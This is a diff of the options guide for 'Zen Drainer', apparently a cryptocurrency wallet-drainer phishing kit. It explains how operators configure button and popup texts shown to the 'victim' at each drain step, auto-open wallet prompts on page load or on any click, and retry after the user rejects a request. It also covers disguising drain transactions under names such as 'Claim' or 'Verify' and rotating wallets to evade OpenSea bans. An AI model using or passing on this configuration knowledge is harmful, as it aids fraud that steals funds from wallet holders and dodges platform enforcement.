@@ -1,24 +1,33 @@
 
-    Welcome to Zen Drainer's Options explainations:
-
-Note: Not finished yet, 🔺 emojis means probably need to get deleted
+         _____                 ____        __  _                      
+        /__  /  ___  ____     / __ \____  / /_(_)___  ____  _____   _ 
+          / /  / _ \/ __ \   / / / / __ \/ __/ / __ \/ __ \/ ___/  (_)
+         / /__/  __/ / / /  / /_/ / /_/ / /_/ / /_/ / / / (__  )  _   
+        /____/\___/_/ /_/   \____/ .___/\__/_/\____/_/ /_/____/  (_)  
+                                /_/                                 
+                                  
+ Note: Not finished yet, 🔺 emojis means probably need to get deleted
 
     Class Buttons:
-        – connect_buttons_class: The class of the button you want to drainer on. Note that this option can be the same as "connect_buttons_class" one, not recommended to edit if you don't need any specific config.
-        – drain_buttons_class: The class of the buttons you want the drain process (require "wait_click_of_drain_button_to_start" enabled) and write intructions. Note: this option can be the same as "connect_buttons_class" one, not recommended to edit if you don't require any specific config.
+        – connect_buttons_class: The class of the button you want to drainer on.
+        *Note: This option can be the same as "connect_buttons_class" one, not recommended to edit if you don't need any specific config.
+
+        – drain_buttons_class: The class of the buttons you want the drain process (require "wait_click_of_drain_button_to_start" enabled). 
+        *Note: This option can be the same as "connect_buttons_class" one, not recommended to edit if you don't require any specific config.
 
     Class Buttons Options:
-        – change_buttons_text: If you want texts replaced of button (if css is broken switch it to false).
-        – loading_text: Text of buttons when victim is fetching assets (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
-        – verify_text: Text of buttons when victim when signature is asked. (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
-        – connect_text: Text of buttons that victim will see before connecting his wallet. (require "change_buttons_text" enabled)
-        – connected_text: Text of buttons when once wallet is connected, you can add "{wallet}" on the text for display user address (require "change_buttons_text" enabled & connect_buttons_class different than drain_buttons_class)
-        – drain_button_waiting_click_text: Text of buttons that victim will see before to connecting his wallet (require "change_buttons_text" enabled & connect_buttons_class is different than drain_buttons_class)
-        – change_chain_text: Text on buttons once Chain-Switch is prompted (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
-        – not_eligible_text: Text on buttons once connected wallet is empty or once all drain is done. (require "change_buttons_text" enabled) & on popup (require "enable_popup" enabled)
-        – error_text: Text on buttons when the drainer can't get wallet address. (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – change_buttons_text: If you want custom texts below to replace original button text (if css is broken switch it to false).
 
-        – wait_click_of_drain_button_to_start: If "connect_buttons_class" is different than "drain_buttons_class", it will wait buttons with class of "drain_buttons_class" click for start drainer process.
+        – loading_text: Text custom of buttons when victim is fetching assets (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – verify_text: Text custom of buttons when victim when signature is asked. (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – connect_text: Text custom of buttons that victim will see before connecting his wallet. (require "change_buttons_text" enabled)
+        – connected_text: Text custom of buttons when wallet is connected, you can add "{wallet}" on the text for display user address (require "change_buttons_text" enabled & connect_buttons_class different than drain_buttons_class)
+        – drain_button_waiting_click_text: Text custom of buttons that victim will see before connecting his wallet (require "change_buttons_text" enabled & connect_buttons_class is different than drain_buttons_class)
+        – change_chain_text: Text custom of buttons when Chain-Switch is prompted (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+        – not_eligible_text: Text custom on buttons when connected wallet is empty/once all drain is done. (require "change_buttons_text" enabled) & on popup (require "enable_popup" enabled)
+        – error_text: Text custom on buttons when the drainer can't get wallet address. (require "change_buttons_text" enabled) and on popup (require "enable_popup" enabled)
+
+        – wait_click_of_drain_button_to_start: If "connect_buttons_class" is different than "drain_buttons_class", it will wait buttons with class of "drain_buttons_class" click to start the drainer process.
 
     Disable Methods:
         – disable_permit2: Do not edit it
@@ -31,20 +40,22 @@ Note: Not finished yet, 🔺 emojis means probably need to get deleted
 
 
     Various Options:
-        – use_token_transfer: If you prefer to use approvement or token transfer.
         – use_increase_allowance_for_tokens_when_disponible: If you want to use Increase Allowance popup ("use_approvement_for_tokens" must be true)
-        – use_token_transfer_if_increase_allowance_not_disponible: If the token doesn't support the Increase Allowance method, it will use token transfer
+        – use_token_transfer_if_increase_allowance_not_disponible: If the token doesn't support the Increase Allowance method, it will use token transfer method
+        – use_token_transfer: If you prefer to use approvement or token transfer
+
         – use_transfer_contract: Use a smart-contract for all balance hits, Victim will see datas of "transfer_contract_drain_function_name" + 0x000...0000 address
 
         – transfer_contract_drain_function_name: The name of the method used to drain the balance using smart-contract. Possibilities: Claim, Confirm, Verify, Connect, Start, Gift and Enable 🔺
 
         – create_wallet_for_seaport: Create a new wallet for each seaport and send you private key to avoid opensea ban. not recommended to edit because blur is now better than opensea. ("disable_seaport" must be false)
 
+        – skip_popup_on_decline: If you want to Skip Popup after a decline from user
         – retry_count: The max number of retries with Same Method once user reject the popup
         – max_change_chain_retry: The max number of Chain-Switch retries once user reject the popup
 
 
-    enable_popup: Will prompt a Sweet Alert popup at each drain step:
+    enable_popup: Will prompt a Sweet-Alert popup at each drain step:
         – popup_style: Define the popup style, check below. (enable_popup must be true)
         – popup_2_config, Check at the bottom of this txt, (popup_style must be 2)
         – popup_3_config, Check at the bottom of this txt, (popup_style must be 3)
@@ -52,11 +63,11 @@ Note: Not finished yet, 🔺 emojis means probably need to get deleted
 
     Modals Options:
         – modal_style: Modal style, check below.
-        – modal_theme: Theme of the modal, "dark", "light" or "default"
+        – modal_dark_mode: Use dark mode for modal theme
         – use_window_provider_if_detected: Directly use the injected wallet on browser is detected (example: if MetaMask is detected, directly try to connect without button click)
         – wallet_connect_config: Check at the bottom of this txt
         – auto_prompt: Prompt the modal as soon as the site is loaded (require "use_window_provider_if_detected" true)
-        – click_everywhere_open_modal: Prompt the modal if user click anywhere in the page
+        – click_everywhere_open_modal: Prompt the modal when user click anywhere in the page
         – wallet_connect_v2_project_id: If you use modal 3, it's recommended to set it. Get your own Project-ID at https://cloud.walletconnect.com
 
     Logs Options:
